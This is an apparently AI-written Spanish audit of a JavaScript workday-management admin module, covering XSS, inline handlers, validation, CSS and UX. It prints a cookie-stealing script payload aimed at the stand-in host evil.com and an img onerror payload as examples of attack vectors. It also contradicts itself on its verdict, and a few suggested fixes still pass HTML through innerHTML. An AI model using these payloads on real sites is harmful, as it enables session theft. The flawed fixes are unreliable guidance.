# Auditoría: admin-workdays

> **Fecha**: 2026-01-29
> **Auditor**: Claude Agent (ui-ux-auditor)
> **Módulo**: admin-workdays
> **Archivos**: admin-workdays.js (440 líneas), admin-workdays.html (153 líneas)
> **Resultado**: 🟡 **APROBADO CON OBSERVACIONES**
> **Score**: **7.5/10**

---

## 📊 Resumen Ejecutivo

El módulo `admin-workdays` es funcional y bien estructurado, pero presenta **vulnerabilidades críticas de XSS** y malas prácticas que deben corregirse antes de producción. El código sigue parcialmente el Golden Standard, con buena arquitectura base pero problemas serios en seguridad.

**Funcionalidad**: Dashboard de gestión de jornadas laborales con:
- Visualización de jornadas (abiertas, planificadas, cerradas)
- Creación de planificación con dotación de personal
- Apertura/cierre de jornadas (vía RPC)
- Confirmación de acciones críticas

---

## 🚨 Issues Críticos (BLOCKER)

### 1. XSS CRÍTICO: Inyección sin Sanitización (Múltiples Ubicaciones)

#### Vulnerabilidad A: Nombres de Roles sin Escape

**Ubicación**: admin-workdays.js:284

**Código vulnerable**:
```javascript
<span class="font-medium text-sm">${role.name}</span>
```

**Problema**: El nombre del rol viene directo de la base de datos (`master_staff_roles.name`) sin sanitización.

**Vector de ataque**:
1. Admin malicioso crea rol con nombre: `<script>document.location='evil.com?cookie='+document.cookie</script>`
2. Al abrir panel de planificación, el script se ejecuta
3. Robo de sesión, cookie hijacking

**Fix**:
```javascript
<span class="font-medium text-sm">${window.Utils.escapeHtml(role.name)}</span>
```

---

#### Vulnerabilidad B: Notas sin Escape en Tabla

**Ubicación**: admin-workdays.js:168

**Código vulnerable**:
```javascript
<td class="table-cell cell-pad muted text-xs">
    ${item.notes || '-'}
</td>
```

**Problema**: Campo `notes` (línea 322: `ui.panel.notes.value.trim() || null`) se guarda sin validación y se renderiza sin escape.

**Vector de ataque**:
1. User ingresa notas: `<img src=x onerror=alert(document.cookie)>`
2. Se guarda en BD
3. Cada render de la tabla ejecuta el payload

**Fix**:
```javascript
${window.Utils.escapeHtml(item.notes) || '-'}
```

---

#### Vulnerabilidad C: Mensaje HTML en Modal Personalizado

**Ubicación**: admin-workdays.js:412

**Código vulnerable**:
```javascript
ui.confirmModal.message.innerHTML = htmlMessage;
```

**Problema**: Aunque `htmlMessage` es controlado internamente (líneas 91, 96), usar `.innerHTML` directamente es una mala práctica que puede causar bugs si se refactoriza.

**Contexto actual**:
```javascript
// Línea 91
`¿Deseas abrir la jornada del <b>${date}</b>?`
```

Si `date` no está sanitizado y proviene de input malicioso, hay XSS.

**Validación del vector**: Línea 206 usa `window.WorkDayHelper.formatDate(item.work_date)` - **Necesito verificar si formatDate sanitiza**.

**Recomendación**:
```javascript
// Mejor: Crear elementos DOM
const msgContainer = ui.confirmModal.message;
msgContainer.textContent = ''; // Clear
const span = document.createElement('span');
span.innerHTML = htmlMessage; // Si necesitas HTML, úsalo con cuidado
msgContainer.appendChild(span);

// O mejor aún: Evitar HTML dinámico
ui.confirmModal.message.textContent = htmlMessage.replace(/<[^>]*>/g, '');
```

**Score de severidad**: ALTA (depende de helper externo)

---

### 2. Uso de `onclick` en HTML Generado Dinámicamente

**Ubicación**: admin-workdays.js:199, 211

**Código**:
```javascript
// Línea 199
<button class="btn-ghost btn-sm text-danger" onclick="WorkDayActions.closeDay('${item.id}')">CERRAR</button>

// Línea 211
<button class="btn-ghost btn-sm text-success" onclick="WorkDayActions.openDay('${item.id}', '${dateParam}')">ABRIR</button>
```

**Problemas**:
1. **Mala práctica**: Mixing JS inline con architecture moderna
2. **Riesgo XSS**: Si `item.id` o `dateParam` no están sanitizados, hay inyección
3. **Mantenibilidad**: Difícil debugging, CSP (Content Security Policy) bloqueará en producción

**Análisis**:
- `item.id`: UUID de BD (seguro en teoría, pero no validado)
- `dateParam`: Viene de `window.WorkDayHelper.formatDate()` (necesito verificar)

**Solución**: Event delegation

```javascript
// Cambiar línea 199:
<button class="btn-ghost btn-sm text-danger js-close-day" data-id="${item.id}">CERRAR</button>

// Agregar event listener en bindEvents():
ui.listContainer?.addEventListener('click', (e) => {
    const btnClose = e.target.closest('.js-close-day');
    if (btnClose) {
        const id = btnClose.dataset.id;
        confirmAction(
            'Confirmar Cierre',
            '¿CERRAR LA JORNADA?<br>Esto bloqueará nuevas transacciones.',
            () => executeCloseDay(id)
        );
    }
    // Similar para .js-open-day
});

// ELIMINAR window.WorkDayActions (líneas 88-99)
```

**Esfuerzo**: 30 minutos

---

## ⚠️ Issues de Seguridad (ALTA)

### 3. Falta de Validación en Inputs Críticos

**Ubicación**: admin-workdays.js:308-310

**Código**:
```javascript
async function savePlanning() {
    const dateVal = ui.panel.date.value;
    if (!dateVal) return window.Toast.warning('Ingresa una fecha válida');
```

**Problema**: Solo valida que exista, no valida formato o rango.

**Riesgos**:
- Fecha en el pasado (operación ya cerrada)
- Fecha muy futura (años adelante)
- Formato inválido (aunque `type="date"` ayuda en frontend)

**Fix**:
```javascript
const dateVal = ui.panel.date.value;
if (!dateVal) return window.Toast.warning('Ingresa una fecha válida');

const selectedDate = new Date(dateVal);
const today = new Date();
today.setHours(0, 0, 0, 0);

if (selectedDate < today) {
    return window.Toast.warning('No puedes planificar jornadas en el pasado');
}

const maxDate = new Date(today);
maxDate.setDate(today.getDate() + 90); // Max 3 meses adelante
if (selectedDate > maxDate) {
    return window.Toast.warning('Solo puedes planificar hasta 90 días adelante');
}
```

---

### 4. Falta de Validación en Cantidades de Personal

**Ubicación**: admin-workdays.js:332-337

**Código**:
```javascript
const plans = activeInputs.map(inp => ({
    work_day_id: day.id,
    role_id: inp.getAttribute('data-role-id'),
    quantity: parseInt(inp.value),
    approved_budget: parseInt(inp.value) * parseFloat(inp.getAttribute('data-rate'))
}));
```

**Problemas**:
1. No valida que `quantity` sea > 0 (línea 313 filtra, pero no está explícito)
2. No valida límites máximos (e.g., 1000 personas = error o ataque)
3. `approved_budget` puede ser `NaN` si `data-rate` es inválido

**Fix**:
```javascript
const plans = activeInputs.map(inp => {
    const qty = parseInt(inp.value);
    const rate = parseFloat(inp.getAttribute('data-rate'));

    if (qty <= 0 || qty > 100) throw new Error(`Cantidad inválida: ${qty}`);
    if (isNaN(rate) || rate < 0) throw new Error('Tarifa inválida');

    return {
        work_day_id: day.id,
        role_id: inp.getAttribute('data-role-id'),
        quantity: qty,
        approved_budget: qty * rate
    };
});
```

---

## 🏗️ Arquitectura: 8/10

### ✅ Fortalezas

#### Auth Guard Correcto
```javascript
// Línea 9
const session = await window.Auth.guardOrRedirect(['admin', 'contable']);
if (!session) return;
```

**Evaluación**: PERFECTO - Roles específicos, early return.

---

#### IIFE Pattern
```javascript
// Línea 5
(async function () {
    'use strict';
    // ...
})();
```

**Evaluación**: PERFECTO - Wrapper async IIFE + strict mode.

---

#### UI Object Centralizado
```javascript
// Líneas 13-43
const ui = {
    listContainer: document.getElementById('list-container'),
    loadingState: document.getElementById('page-card-loading'),
    // ... bien organizado
    panel: { ... },
    confirmModal: { ... }
};
```

**Evaluación**: EXCELENTE - Organización por categoría (main, panel, modal).

---

#### State Management
```javascript
// Líneas 49-53
const state = {
    days: [],
    roles: [],
    panelInstance: null
};
```

**Evaluación**: PERFECTO - Objeto `state` centralizado (mejor que variables sueltas).

---

#### Safety Check
```javascript
// Línea 46
if (!window.Utils.assertSbOrShowBlockingError(ui.listContainer)) return;
```

**Evaluación**: PERFECTO.

---

### 🟡 Mejoras Arquitectónicas

#### Separación de Responsabilidades
**Evaluación**: BUENO - Funciones separadas (loadData, render, actions) pero algunas muy largas.

**Ejemplo de función larga**: `renderTable()` (líneas 140-193) - 53 líneas mezclando lógica de estado, render y configuración.

**Refactor sugerido**:
```javascript
function renderTable(list, stats = {}) {
    if (list.length === 0) {
        showEmptyState();
        return;
    }
    hideEmptyState();

    const hasOpenDay = list.some(d => d._status === 'open');
    const rows = list.map(item => renderRow(item, stats[item.id], hasOpenDay)).join('');
    ui.listContainer.innerHTML = createTableHtml(rows);
}

function renderRow(item, stat, hasOpenDay) {
    const dateStr = window.WorkDayHelper.formatDate(item.work_date);
    const statusCfg = getStatusConfig(item._status, hasOpenDay, item);
    const coverage = getCoverageHtml(stat || { planned: 0, confirmed: 0 });

    return `<tr class="table-row ${statusCfg.rowClass}">...</tr>`;
}
```

---

## 🎨 CSS: 7/10

### ⚠️ CSS Alien Detectado

**Ubicaciones**:
- admin-workdays.js:233 - `flex items-baseline gap-1`
- admin-workdays.js:282 - `flex items-center justify-between`
- admin-workdays.js:283 - `flex flex-col`

**Análisis**: Estas son clases **Tailwind-like** no estándar en el proyecto.

**Impacto**: No rompe (browser ignora), pero inconsistente.

**Solución**: Crear clases semánticas:
```css
/* components.css */
.stat-row {
  display: flex;
  align-items: baseline;
  gap: 0.25rem;
}

.role-card {
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.role-info {
  display: flex;
  flex-direction: column;
}
```

**Esfuerzo**: 20 minutos.

---

### ✅ Uso Correcto de Clases Semánticas

**Ejemplos**:
```javascript
// Línea 179
<table class="table table-sticky">

// Línea 198
<span class="status-pill status-success">EN CURSO</span>
```

**Evaluación**: BUENO - Mayoría usa clases del proyecto.

---

## 🚀 Performance: 8/10

### ✅ Delegación a Helper Externo

**Código**: Líneas 107, 118
```javascript
const summary = await window.WorkDayHelper.getWorkDaySummary();
const stats = await window.WorkDayHelper.getAttendanceStats(...);
```

**Evaluación**: EXCELENTE - Lógica compleja delegada a helper especializado.

**Beneficio**: Módulo más limpio, helper reutilizable.

---

### 🟡 Queries Secuenciales

**Ubicación**: Líneas 107-119

**Código**:
```javascript
const summary = await window.WorkDayHelper.getWorkDaySummary();
// Espera...
const stats = await window.WorkDayHelper.getAttendanceStats(state.days.map(d => d.id));
```

**Problema**: Segundo query espera al primero innecesariamente.

**Optimización**:
```javascript
// Si WorkDayHelper permite, paralelizar:
const [summary, rawStats] = await Promise.all([
    window.WorkDayHelper.getWorkDaySummary(),
    // Pero stats necesita IDs de summary... no se puede paralelizar sin refactor mayor
]);

// Alternativa: Hacer que getWorkDaySummary devuelva stats incluidos
```

**Nota**: Depende de diseño del Helper. Si Helper ya optimiza internamente, OK.

---

### ✅ Data Mapping Eficiente

**Código**: Línea 155
```javascript
const stat = stats[item.id] || { planned: 0, confirmed: 0 };
```

**Evaluación**: PERFECTO - Lookup O(1), default fallback.

---

## 🛡️ UX: 7/10

### ✅ Loading/Empty States

**Código**: Líneas 382-403

**Evaluación**: BUENO - Helpers `setLoading()` y `toggleEmptyState()` correctos.

**Mejora**: Funciones casi idénticas, podrían unificarse:
```javascript
function setUIState({ loading = false, empty = false }) {
    ui.loadingState?.classList.toggle('is-visible', loading);
    ui.emptyState?.classList.toggle('is-visible', !loading && empty);
    ui.moduleContent?.classList.toggle('hidden', loading || empty);
}
```

---

### ✅ Toast Feedback

**Ejemplos**:
```javascript
// Línea 346
window.Toast.success('Planificación creada correctamente');

// Línea 124
window.Toast.error('Error cargando jornadas.');
```

**Evaluación**: EXCELENTE - Consistente en todas las operaciones.

---

### 🟡 Confirmación de Acciones Críticas

**Código**: Líneas 405-434 - Modal confirmación personalizado

**Evaluación**: BUENO - Implementa modal custom con fallback a `confirm()` nativo.

**Problema detectado**: Línea 407 usa regex para strip HTML en fallback:
```javascript
if(confirm(htmlMessage.replace(/<[^>]*>?/gm, ''))) onConfirm();
```

**Issue**: Regex básico no maneja todos los casos (atributos con `>`, CDATA, etc.).

**Fix**:
```javascript
// Mejor: Crear elemento temporal para strip HTML
const stripHtml = (html) => {
    const tmp = document.createElement('div');
    tmp.innerHTML = html;
    return tmp.textContent || tmp.innerText || '';
};

if(confirm(stripHtml(htmlMessage))) onConfirm();
```

---

### 🟡 Modal: Clone para Limpiar Listeners

**Código**: Líneas 414-422

```javascript
// Clone buttons to clear listeners
const newConfirm = ui.confirmModal.btnConfirm.cloneNode(true);
const newCancel = ui.confirmModal.btnCancel.cloneNode(true);
ui.confirmModal.btnConfirm.parentNode.replaceChild(newConfirm, ui.confirmModal.btnConfirm);
```

**Evaluación**: FUNCIONA pero es un **hack**.

**Problema**: Complejo, propenso a bugs si DOM cambia.

**Mejor práctica**: Usar `AbortController` o remover listeners explícitamente:
```javascript
// Opción 1: AbortController (moderno)
let abortController = new AbortController();

function confirmAction(title, htmlMessage, onConfirm) {
    if (abortController) abortController.abort(); // Cancela listeners previos
    abortController = new AbortController();

    ui.confirmModal.btnConfirm.addEventListener('click', () => {
        window.Utils.hide(ui.confirmModal.el);
        onConfirm();
    }, { signal: abortController.signal });
}

// Opción 2: Named functions
function handleConfirm() { /* ... */ }
ui.confirmModal.btnConfirm.removeEventListener('click', handleConfirm);
ui.confirmModal.btnConfirm.addEventListener('click', handleConfirm);
```

---

## 📋 Checklist Final

| Criterio | Estado | Nota |
|:---------|:-------|:-----|
| **Seguridad** | | |
| Auth guard | ✅ | Línea 9 - Roles: admin, contable |
| XSS prevention | ❌ | **CRÍTICO**: Líneas 168, 284 sin escape |
| Input validation | 🟡 | Fecha: falta validación de rango |
| Onclick inline | ❌ | Líneas 199, 211 - Mala práctica |
| **Arquitectura** | | |
| IIFE wrapper | ✅ | Línea 5 |
| UI object | ✅ | Líneas 13-43 - Bien organizado |
| State management | ✅ | Líneas 49-53 - Objeto `state` |
| Safety check | ✅ | Línea 46 |
| **CSS** | | |
| Semantic classes | 🟡 | Mayoría correcto, algunos alien |
| No Tailwind | ⚠️ | Líneas 233, 282, 283 usan clases alien |
| **Performance** | | |
| Queries | 🟡 | Secuenciales pero delegados a Helper |
| Event delegation | ❌ | Usa onclick inline en lugar de delegation |
| **UX** | | |
| Loading states | ✅ | Helpers correctos |
| Toast feedback | ✅ | Consistente |
| Confirmations | 🟡 | Modal custom OK, pero con hacks |

---

## 🎯 Plan de Remediación

### CRÍTICO (Hacer Antes de Deploy)

#### 1. Fix XSS en Roles (Línea 284)
```javascript
// ANTES
<span class="font-medium text-sm">${role.name}</span>

// DESPUÉS
<span class="font-medium text-sm">${window.Utils.escapeHtml(role.name)}</span>
```

**Esfuerzo**: 2 minutos
**Impacto**: Previene XSS crítico

---

#### 2. Fix XSS en Notas (Línea 168)
```javascript
// ANTES
${item.notes || '-'}

// DESPUÉS
${window.Utils.escapeHtml(item.notes) || '-'}
```

**Esfuerzo**: 2 minutos
**Impacto**: Previene XSS persistente

---

#### 3. Eliminar onclick, Usar Event Delegation (Líneas 199, 211)

**Cambios**:
1. Reemplazar `onclick="..."` con `data-action` y `data-id`
2. Agregar event delegation en `bindEvents()`
3. Eliminar `window.WorkDayActions` (líneas 88-99)

**Esfuerzo**: 30 minutos
**Impacto**: Seguridad + mantenibilidad

---

### ALTA PRIORIDAD (Próximo Sprint)

#### 4. Validación de Fecha (Líneas 308-310)
Ver código en sección "Issues de Seguridad #3"

**Esfuerzo**: 15 minutos

---

#### 5. Validación de Cantidades (Líneas 332-337)
Ver código en sección "Issues de Seguridad #4"

**Esfuerzo**: 20 minutos

---

#### 6. Fix CSS Alien (Líneas 233, 282, 283)
Crear clases `.stat-row`, `.role-card`, `.role-info` en components.css

**Esfuerzo**: 20 minutos

---

### MEDIA PRIORIDAD (Backlog Q1)

#### 7. Refactorizar Modal Confirmation
Reemplazar clone hack con AbortController

**Esfuerzo**: 45 minutos

---

#### 8. Refactorizar renderTable()
Separar en funciones más pequeñas

**Esfuerzo**: 1 hora

---

## 🏆 Conclusión

**Score Final: 7.5/10**

El módulo `admin-workdays` tiene una **arquitectura sólida** (IIFE + UI object + state management) pero está **bloqueado para producción** por:

❌ **2 vulnerabilidades XSS críticas** (líneas 168, 284)
❌ **Uso de onclick inline** (anti-patrón de seguridad)
🟡 **Falta de validación en inputs críticos**
🟡 **CSS alien** (menor, no blocker)

**Fortalezas**:
- Auth guard correcto
- Arquitectura base sólida
- Loading/empty states bien implementados
- Toast feedback consistente
- Delegación a helpers externos

**Recomendación**: **RECHAZAR** hasta aplicar fixes críticos (items 1-3).

Una vez aplicados los fixes de XSS y onclick, el score subiría a **8.5/10** y sería aprobable para producción.

---

**Próximos Pasos**:
1. Aplicar fixes XSS (items 1-2) - 5 minutos
2. Refactorizar onclick a event delegation (item 3) - 30 minutos
3. Agregar validaciones (items 4-5) - 35 minutos
4. Re-auditar antes de deploy

**Total esfuerzo para aprobación**: ~1 hora 10 minutos

---

**Auditor**: Claude Agent (ui-ux-auditor)
**Fecha**: 2026-01-29
**Versión**: 1.0
